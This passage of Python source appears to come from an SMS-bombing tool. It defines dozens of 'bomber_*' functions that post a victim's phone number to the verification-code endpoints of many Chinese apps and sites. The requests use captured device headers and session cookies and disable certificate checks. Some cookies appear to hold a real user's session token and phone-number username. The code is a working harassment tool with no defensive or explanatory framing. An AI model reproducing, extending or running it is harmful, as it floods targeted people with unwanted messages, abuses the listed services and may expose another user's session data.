    headers = {'signature': '38386ecef28dfce72a50085435ba146e', 'device': 'a79523ef-9c34-44bb-9dd4-a41b6babf475', 'version': '3.27.0', 'platform': 'ANDROID', 'terminal': 'APP', 'timestamp': str(int((time.time() * 1000))), 'content-type': 'application/json; charset=utf-8', 'authorization': '', 'channel': 'oppo', 'sequence': '173', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.4 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_eyasapi_job5156_com(phone):
    'job5156.com 发送验证码'
    url = 'https://eyasapi.job5156.com/verify/dynamic/login'
    payload2 = {'isCheckAccount': 'false', 'mobile': phone}
    headers = {'Cookie': 'area=14010000;appType=app;appVersion=android-11.27.0;uuid=a11619ed-722d-4565-a85f-30ffc1773157;os=android-16;hardware=PJE110;accountFrom=5010016;sensors_distinct_id=6a0d60cde991dc2a;oaid=F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157;', 'version': '2.0', 'posTypeNewFlag': 'true', 'appType': 'app', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_jzmerchant_passportweb_daojia_com(phone):
    'daojia.com 发送验证码'
    url = 'https://jzmerchant-passportweb.daojia.com/mobile/getcode'
    payload2 = {'newVersion': '1', 'mobile': phone, 'bu': '1011', 'uid': ''}
    headers = {'Cookie': 'djfrtappversion=9.4.40;dj_imei_en=B18C3951EFDECEE24D3CBA5B037198642636CB1F7909E26C4D0DBC90288633E6E42202E76DC04D96F0EF77E94314F634;djbusiness=101;djclient=30;djcpassimei=ffffffff94e8f6f5ffffffffa1a4674b;dj_os=android;dj_mac=;djfrtimei_en=B18C3951EFDECEE24D3CBA5B037198642636CB1F7909E26C4D0DBC90288633E6E42202E76DC04D96F0EF77E94314F634;djfrtappid=58daojiaapp-ayi-android;djfrtimei=ffffffff94e8f6f5ffffffffa1a4674b;djcpassappid=jiazheng-android;dj_imei=ffffffff94e8f6f5ffffffffa1a4674b;djcpassimei_en=;; djfrtappversion=9.4.40; dj_imei_en=B18C3951EFDECEE24D3CBA5B037198642636CB1F7909E26C4D0DBC90288633E6E42202E76DC04D96F0EF77E94314F634; djbusiness=101; djclient=30; djcpassimei=ffffffff94e8f6f5ffffffffa1a4674b; dj_os=android; dj_mac=; djfrtimei_en=B18C3951EFDECEE24D3CBA5B037198642636CB1F7909E26C4D0DBC90288633E6E42202E76DC04D96F0EF77E94314F634; djfrtappid=58daojiaapp-ayi-android; djfrtimei=ffffffff94e8f6f5ffffffffa1a4674b; djcpassappid=jiazheng-android; dj_imei=ffffffff94e8f6f5ffffffffa1a4674b; djcpassimei_en=', 'content-length': '0', 'channelid': 'ayi_oppo', 'serviceid': '101', 'gpscityid': '2346', 'androidosversion': '16', 'from': 'ayi', 'appid': '30', 'logintype': 'PassportLogin', 'pmodel': 'PJE110', 'i': '2', 'os': 'android', 'appbrand': 'OnePlus', 'c': '111aa95eae00bc5000314ad35586efe0', 'appversion': '9.4.40', 'imei-en': 'B18C3951EFDECEE24D3CBA5B037198642636CB1F7909E26C4D0DBC90288633E6E42202E76DC04D96F0EF77E94314F634', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.8.0'}
    requests.post(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_3g_kq36_com(phone):
    url = 'https://3g.kq36.com/public/returnhtm/return_mobile_ajax.asp'
    data = {'cfrom': 'm', 'mobile': phone, 'cmd': 'modify_per_phone'}
    headers = {'Cookie': 'ASPSESSIONIDSASQQSRS=OPOGADOCGJALBDCBDLMHGKDI; fikker-ClNN-yOWF=IJUb3FQMcp7fQFKBIfeZYTO254ObmvI6; fikker-ClNN-yOWF=IJUb3FQMcp7fQFKBIfeZYTO254ObmvI6; fikker-YdEn-ePSF=ETGJOT3FgvURN4CKIZs6J4EhsPsMSTQD; peruois=8793rFG6lWMEh71f7XGv3f5kVRNKQJ9uv7U%2FshIvkkRGwLsd9y3jScOszkGwIXE; regPer=1; ASPSESSIONIDSCSQTQQS=EEDBADOCKAIHEGHGJOEMLLKJ; html5plus=html5plus; ASPSESSIONIDSAQRTQRS=EBGCADOCMBIIKJPFDPLLCJII; GuidServer=AF7CBE4B0E73457EA63ABF107A2ECAD0; userapp=ret=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9%2EeyJ1c2VySWQiOiI3NDA3NjYxIiwidXNlck5hbWUiOiIxNTE5ODgzNDk2MyIsInVzZXJUeXBlIjoicCIsImxvZ2luVGltZSI6IjIwMjYtMDYtMTQgMjI6MjY6NDQifQ%2Ei7fV%5FXzMn%2DBv5eF4zF9JBmso6fnGHFJGAwSGbH7Xilw; usercookies=usertype=p&username=15198834963&en%5Fuserstr=e49bsUk%2BuouPhWuJymofN325vybSwBzN01vcbHUjq7%2FUrMKUvGQ%2FuGQOhBBJUjXm5N9ohtHW9J351Vgl7avgmMmhzSazMZl9CFa3vzJlp85bAL4MNImvdIvOgw', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Referer': 'https://3g.kq36.com/public/returnhtm/modifyphone_m.asp?cfrom=m&ret=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI3NDA3NjYxIiwidXNlck5hbWUiOiIxNTE5ODgzNDk2MyIsInVzZXJUeXBlIjoicCIsImxvZ2luVGltZSI6IjIwMjYtMDYtMTQgMjI6MjY6NDQifQ.i7fV_XzMn-Bv5eF4zF9JBmso6fnGHFJGAwSGbH7Xilw&isap=0&sjs=uE1Kt19I4jVrKKzjWEAn&ranKey=1781447239640', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'Origin': 'https://3g.kq36.com', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-platform': '"Android"', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0[KQ36/android/Message/WX/OH/kq36.com/10.5/guid:df51d41b3368fb8cef58aa2b462feb72]'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_api_v2_jianzhugang_com(phone):
    'jianzhugang.com 发送验证码'
    url = 'https://api-v2.jianzhugang.com/app/verifyCodes/sendCode'
    data = {'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_csrv_dipin_com(phone):
    url = 'https://csrv.dipin.com/api/client/sms'
    payload = {'mode': 'LOGIN', 'mobile': phone}
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'longitude': '', 'latitude': '', 'district': '', 'city': '', 'province': '', 'systemversion': '16', 'brand': 'OnePlus', 'version': '3.10.2.0', 'oaid': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'channel': 'C00040', 'user-channel': 'Android', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_job_sdjuliangnet_com(phone):
    'sdjuliangnet.com 发送验证码'
    url = 'https://job.sdjuliangnet.com/jzxzapi.php/index/sendsmsv2'
    data = {'sub_channel': '', 'app_id': '12', 'ismp': '1', 'type': '1', 'tel': phone, 'mpversion': '120', 'channel': '106', 'mpdev': '66ZTI9rNiiwZlHrqGlY1uE+HeyHnLAWRFYtP9Icix1RxL/2BWr4a0QUblUMEkRLnllYRcaPnNukd14ZODN4u8Ii8L6d2MSHbsaoH8nLy5MgXDanFXcQ2RcqT94PmOn8Ja6+TwY7Xo3wyAKtoIuWSWnZv0CBhYn9iB79WQXv4h1H2ZgkyNKnrtHfUew5GjgneGTp+6sKgijnybAqPT/Vg5vxGsmy5KKkZYYVKDDU3iUydM1AY0coj6fnhu1c9niyGG2t4wX3qiTAqazroPq8lJdKF0gmbysikUjWA89MocHY=', 'userToken': ''}
    headers = {'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/5.0.0-alpha.2'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_job_sdjuliangnet_com(phone):
    'sdjuliangnet.com 发送验证码'
    url = 'https://job.sdjuliangnet.com/jzxzapi.php/index/sendvmsv2'
    data = {'sub_channel': '', 'app_id': '12', 'ismp': '1', 'type': '1', 'tel': phone, 'mpversion': '120', 'channel': '106', 'mpdev': 'H0wZvy0lJ8rhj58mwvmkkZ8lVhfGhP/eU0uEGmazVCPzbzjxJKxGvPoQlTgvGotagqc4fezTIDaCp5l9XY6ahWXe13UVX9oVVths4TdNyBb3Jw8sRaJs9jMRmJBrgkE4zcYkLj/kOtfVddtPYpCSlxdtQ1i+XUHsqG96od1xr0zvsuI2RWpvefMPdsxEfMO0ZIkgg3S8Av0QIivYt6fBfH9lrp0+piKTjA+mLsXQoTfkYZqSYYnsk16k4tO4XWIsGV/xBXOAXFBL+dQv019nNTaqyq8x+u8oObwYNO6dxMM=', 'userToken': ''}
    headers = {'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/5.0.0-alpha.2'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_zhaogong_qibingzhigong_com(phone):
    url = 'https://zhaogong.qibingzhigong.com/merchantapi/captcha/sendSmsCaptcha'
    payload2 = {'phoneNumber': phone}
    headers = {'X-APP-VERSION': '2.34.0', 'X-TIMESTAMP': str(int((time.time() * 1000))), 'X-CLIENT-ID': 'Android_zgqy', 'Content-Length': '0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Android;PJE110_16.0.3.500(CN01);OnePlus;PJE110;1080*2208;version:2.34.0'}
    requests.post(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_api_fengchaojianzhi_com(phone):
    url = 'https://app-api.fengchaojianzhi.com/user/auth/sms/send'
    payload = {'channel': 'android', 'type': 'login', 'phone': phone}
    headers = {'x-platform': 'app', 'x-language': 'zh_CN', 'x-dev-model': 'PJE110', 'x-app-version': '1.4.4', 'x-trace-id': '6b812633-a005-494d-b11c-b1bb07c187dd', 'x-dev-network': '4g', 'x-device-id': '114695049b2dbc067822c251105876b5', 'x-channel': 'oppo', 'x-android-id': 'd8ed37314ab3bd9e', 'x-pkg-sc': 'oppo', 'x-timezone': '+08:00', 'x-app-platform': '1', 'x-dev-name': 'OnePlus PJE110', 'x-oaid': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'x-os-type': 'android', 'x-os-version': '16', 'x-dev-brand': 'oneplus', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'com.fcjz.qzc/1.4.4 (Android 36; PJE110_16.0.3.500(CN01); build:28) oem/OnePlus model/PJE110 screen/1080*2376/3.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_feiyujz_com(phone):
    url = 'https://api.feiyujz.com/app-api/client/auth/send-sms-code'
    payload = {'scene': 1, 'mobile': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'vs': 'Mi42LjM=', 'pn': 'Y29tLmZlaXl1anouZGVhbQ==', 'cyn': '5YWo5Zu9', 'cl': 'T1BQTw==', 'an': '6IKl6bG85YW86IGM', 'di': 'eyJvYWlkIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsIlVNSUQiOiI2YzhjNmM5MzQwOTE3MWY2OWU3NjgxYjhlOTJlN2VhYm9kIiwiYW5kcm9pZE5hbWUiOiJPbmVQbHVzIn0=', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_gufreelancer_com(phone):
    'gufreelancer.com 发送验证码'
    url = 'https://app.gufreelancer.com/api/Qiye/FengXiang'
    data = {'timeZone': '-480', 'lang': 'zn', 'Area_code': '86', 'mobile': phone, 'deviceToken': 'V0VCI3NoZjg5ZDUyZTNoczRmMzRhMTRiYjJjZWFmNjQ0ZDk3LWgtMTc4MTUwOTQ3MzQ4NS1kYzk1OWM1ZTBjZGU0ZDY5OWUyMzUxYzFkOTk3MDQ4NyNHK053YnFHMTFBcGhRNEc1TFJoWW9mSHlSREExdFV0R2hVYSswQkNNOTJnM2RycXo4R3RDdmtPa1ptcDIxbkdUUGpJdGlucXBvWDdFM2VERnp6MXM3cFJuMk9VdTJrOWZTai9SSHhCVVNuWjJZK0NPSHJ3UHBqZDMxaWNQdk9BVEpoaHZzVE81ZWJnRFdOd1IvSXIrNTB0NGxnb1FYM2ZDQ01JdFZ6UlNpaStZMU56M05xOUE5YWhIQ3hNK1hQZXJaWUU0bXFpcklCcGRkWUNXYjUySVRmR0NqcFRLVlVvSXhORVM2a04rblF3cVU2OEd1eG80UEtmQnhxNm5YVlNLU255MlJVUUdyUHI2eFJYbSsrYVJlTjhrMmNGQzhoblc5cFVxaWd1RTNWdldDZDFhV1VNTjBMQTJCaEhtVGkrNWNLdHV6OFd0Nm5lUHdNYnA4VFRXMVB4Nk1hV09KZ1hRbWlBV3dKT0owM2ZhN1RCNEx6V3g2dlYydUowV0Vtc0QyekV1bU01bTc2eVZxaG5XdjhVOGtmcjV6VVV4aDFkM1FjazNLWjJ6K2pCdHdDQmYvNU5abUEvbWduYzJGWWRDMnExeTNxemF4eVo1dERMK3F2OXJPZmZzMmpuKzNUOTgzRG9XQ2pNVzA4dDc0cjlDeXRJcTVwTnFFMFkxTUdzTlRFMk5GN0p1K2JFd2NFR2pNbTBTbmNaTnYyTGkrMkt3VWZmQld2Y0hQSkhjQ0YxcEpFMHd1dk9WVWpTa3RGc3plZWQ1WXYyM2E3QjdPeURMNFFNQnJxanRKOTllQzhDbjBMbW5HL21ZaFZRNlRVWGx0Z2dWSEZoalZkN21nMFhwWXBUUTBhUW5GUUNLYzVEeDdtWTFKeGxKeUZUSDc1aS9PUnpGZHVMQWxkb2tpWjZuS3VCdnRTdzM2M09EMXdZOU41ZHFwL2t0bTBqc1NCUyt5QUtCTjJxRmlwZ1R3N3Myclg4UFVic2RaYkp6SXlydUkySDduR1o1dTh5ZXhKUHJtNjZXVUpqRDljWlhPV3BXM29Xd3pRSG12RFRKRU02cXhDSVc0azBSSE55eUora0NxV0JvSmVjSzZWbGNsMkwwc0x4T3U5WHZOT21RMEFHMTdHV282UT09IzI0MyMxODU2OTA3NDk2YzJiNTZmZTdiNTc5ZTIzNGU0ZGY4ZQ=='}
    headers = {'Charset': 'UTF-8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_feiyujz_com(phone):
    'feiyujz.com 发送验证码'
    url = 'https://api.feiyujz.com/app-api/client/auth/send-sms-code'
    payload = {'scene': 1, 'mobile': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'vs': 'MS4wLjQ=', 'pn': 'Y29tLnpkbWp6LmlzZXdhZw==', 'cyn': '5YWo5Zu9', 'cl': 'T1BQTw==', 'an': '6LWa5aSn57Gz5YW86IGM', 'di': 'eyJvYWlkIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsIlVNSUQiOiI2YzhjNmM5MzQwOTE3MWY2OWU3NjgxYjhlOTJlN2VhYm9kIiwiYW5kcm9pZE5hbWUiOiJPbmVQbHVzIn0=', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_jdapi_jd121_cn(phone):
    'jd121.cn 发送验证码'
    url = 'https://jdapi.jd121.cn/uc/v2/getSMSCode'
    payload2 = {'use_type': '1', 'sign_type': '1', 'account': phone}
    headers = {'username': '', 'osversion': '16', 'versionname': 'v1.8.3', 'versioncode': '84', 'channeltype': 'oppo100_307_1025', 'model': 'PJE110', 'brand': 'OnePlus', 'os': 'android', 'sdkint': '36', 'sourcetype': '1025', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.0'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_bingfengjz_top(phone):
    'bingfengjz.top 发送验证码'
    url = 'https://api.bingfengjz.top/app-api/client/auth/send-sms-code'
    payload = {'scene': 1, 'mobile': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'vs': 'MS4wLjY=', 'pn': 'Y29tLm1yanouano=', 'cyn': '5YWo5Zu9', 'cl': 'T1BQTw==', 'an': '5oKm6LWa5YW86IGM', 'di': 'eyJvYWlkIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsIlVNSUQiOiI2YzhjNmM5MzQwOTE3MWY2OWU3NjgxYjhlOTJlN2VhYm9kIiwiYW5kcm9pZE5hbWUiOiJPbmVQbHVzIn0=', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_qzmotong_top(phone):
    'qzmotong.top 发送验证码'
    url = 'https://api.qzmotong.top/app-api/client/auth/send-sms-code'
    payload = {'scene': 1, 'mobile': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'vs': 'MS4wLjk=', 'pn': 'Y29tLnFpbmd6aHVhbmp6LmRlYW0=', 'cyn': '5YWo5Zu9', 'cl': 'T1BQTw==', 'an': '6L276LWa5YW86IGM', 'di': 'eyJvYWlkIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsIlVNSUQiOiI2YzhjNmM5MzQwOTE3MWY2OWU3NjgxYjhlOTJlN2VhYm9kIiwiYW5kcm9pZE5hbWUiOiJPbmVQbHVzIn0=', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_jmjdrlzy_com(phone):
    'jmjdrlzy.com 发送验证码'
    url = 'https://api.jmjdrlzy.com/app-api/client/auth/send-sms-code'
    payload = {'scene': 1, 'mobile': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'vs': 'MS4xLjI=', 'pn': 'Y29tLnFsbWp6LmR3cWVy', 'cyn': '5YWo5Zu9', 'cl': 'T1BQTw==', 'an': '5Y2D6YeM6ams5YW86IGM', 'di': 'eyJvYWlkIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsIlVNSUQiOiI2YzhjNmM5MzQwOTE3MWY2OWU3NjgxYjhlOTJlN2VhYm9kIiwiYW5kcm9pZE5hbWUiOiJPbmVQbHVzIn0=', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_budingscan_com(phone):
    url = 'https://www.budingscan.com/server/send_msg'
    data = {'nationCode': '86', 'phone': phone, 'current_device': 'A-20a775079b7f9319da11ee72b56d1304b'}
    headers = {'X-channel': 'oppo', 'X-package-name': 'com.wibo.bigbang.ocr', 'X-brand': 'OnePlus', 'X-phone-name': 'PJE110', 'X-ver': '3.6.3.0_public', 'X-phone-os': 'android', 'X-nation': 'China', 'Accept-Language': 'zh-CN', 'X-uid': '', 'X-phone-id': 'A-20a775079b7f9319da11ee72b56d1304b', 'X-device-id': 'e088a208-68a9-11f1-b6b6-b49691e04e00', 'X-request-id': 'f8dd9d8d-5e2e-4cd9-8d46-38219c247d43', 'X-AI-GATEWAY-SIGNATURE': '7Za843tmFVIhcrluKdwwaSTt9OKVxI/ALplxQBUOofc=', 'X-AI-GATEWAY-SIGNED-HEADERS': 'x-ai-gateway-app-id;x-ai-gateway-timestamp;x-ai-gateway-nonce', 'X-AI-GATEWAY-NONCE': 'rcs4uqb70JDDl8Ga', 'X-AI-GATEWAY-TIMESTAMP': str(int(time.time())), 'X-AI-GATEWAY-APP-ID': '0717955433', 'Accept-Encoding': 'gzip', 'Accept': 'application/json;UTF-8', 'User-Agent': 'okhttp/4.9.2'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_thunder_mianzhikeji_com(phone):
    url = 'https://thunder.mianzhikeji.com/thunder-api/sendMsg/code'
    payload2 = {'mobile': phone}
    headers = {'language': 'zh', 'content-type': 'application/json', 'systemversion': '16', 'devicemodel': 'OnePlus PJE110', 'modeltype': '1', 'appversion': '1.4.2', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.8.1'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_api_janoneapp_com(phone):
    url = 'https://api.janoneapp.com/api/auth/smsLogin'
    payload = {'action': 'send_code', 'phone': phone}
    headers = {'x-android-id': 'a88c4bf88009ff74', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_ahzudui_com(phone):
    'ahzudui.com 发送验证码'
    url = 'https://app.ahzudui.com/index.php/api/verification'
    data = {'type': '0', 'code': '', 'pass': '', 'phone': phone}
    headers = {'token': '', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_app_you_yi_cn(phone):
    'you-yi.cn 发送验证码'
    url = ''.join(['https://app.you-yi.cn/app/captcha/sendCode/', str(phone)])
    headers = {'X-App-Version': '1.1.1', 'X-Platform': 'android', 'Authorization': '', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.get(url, headers=headers, timeout=10, verify=False)

def bomber_tqdj_api_10417_com(phone):
    '10417.com 发送验证码'
    url = 'http://tqdj.api.10417.com/users/sendSms'
    payload2 = {'app_version': '103', 'app_channel': 'oppo', 'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_ydcsmini_yundasys_com(phone):
    'yundasys.com 发送验证码'
    url = 'https://ydcsmini.yundasys.com/gateway/interface'
    OQVaJutFGSk62psmzdk25O0QGfqwzo02thJE6jWytVqk = str(int((time.time() * 1000)))
    data = {'data': {'phone': phone}, 'option': (1 == 0), 'action': 'miniProgramService.miniProgramService.user.sendSms', 'req_time': int(OQVaJutFGSk62psmzdk25O0QGfqwzo02thJE6jWytVqk), 'version': 'V1.0', 'appid': 'wsrkg5oi7wuxe7sk'}
    headers = {'Referer': 'https://servicewechat.com/wx5e4e67fa47cfe658/351/page-frame.html', 'Accept-Encoding': 'gzip,compress,br,deflate', 'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36', 'charset': 'utf-8', 'Connection': 'keep-alive', 'Host': 'ydcsmini.yundasys.com'}
    requests.post(url, headers=headers, json=data, timeout=10, verify=(1 == 0))

def bomber_www_3_rabbit_com(phone):
    url = 'https://www.3-rabbit.com/api/sms/send'
    data = {'mobile': phone, 'event': 'register'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'www.3-rabbit.com', 'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'token': ''}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_village_hemeixiangcun_xn__fiqs8s(phone):
    'hemeixiangcun 发送验证码'
    url = 'https://village.hemeixiangcun.xn--fiqs8s/service-user/passport/getSMSCode'
    payload2 = {'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'village.hemeixiangcun.xn--fiqs8s', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'token': '', 'Content-Type': 'application/json;charset:utf-8', 'version': '3.2.3'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_api_huamiwuliu_com(phone):
    'huamiwuliu.com 发送验证码'
    url = 'https://api.huamiwuliu.com/bootybay-user/api/app/portal/register/code'
    payload2 = {'mobile': phone}
    headers = {'authorization': 'Basic YXRoZW5hOmF0aGVuYV9zZWNyZXQ=', 'host': 'api.huamiwuliu.com', 'tenant-id': '000000', 'accept-encoding': 'gzip', 'accept-language': 'zh-CN,zh;q=0.9', 'user-agent': 'Dart/2.14 (dart:io)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_58_58_126_54(phone):
    url = 'http://58.58.126.54:30081/htime/verifycode/send'
    data = {'captchaVerification': '', 'codeType': 'app_register', 'mobile': phone, 'orgCode': 'sbts'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': '58.58.126.54:30081', 'Content-Type': 'application/x-www-form-urlencoded', 'cctoken': 'flutterMockCCTokenUnused', 'User-Agent': 'sbts/3.1.12(vivo iPA2375;Android 14;0.0,0.0;wifi)', 'OrganId': '', 'access_token': '', 'Authorization': ''}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_zizai_work(phone):
    'zizai.work 发送验证码'
    url = 'https://zizai.work/api/user/getreglogincode'
    payload = {'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'zizai.work', 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 (Immersed/28.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_lzf_weimahuliann_com(phone):
    'weimahuliann.com 发送验证码'
    url = 'https://lzf.weimahuliann.com/api/front/user/sendCode'
    payload2 = {'phone': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'lzf.weimahuliann.com', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'Content-Type': 'application/json;charset=UTF-8;', 'FROM-TYPE': 'app', 'companyId': '12', 'Authorization': ''}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_xinlaichewang_com(phone):
    'xinlaichewang.com 发送验证码'
